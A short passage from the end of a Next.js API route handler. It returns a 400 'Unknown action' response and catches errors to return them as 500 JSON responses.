      return NextResponse.json({ error: "Unknown action" }, { status: 400 });
    }
  } catch (error) {
    return NextResponse.json({ error: error.message }, { status: 500 });
  }
}
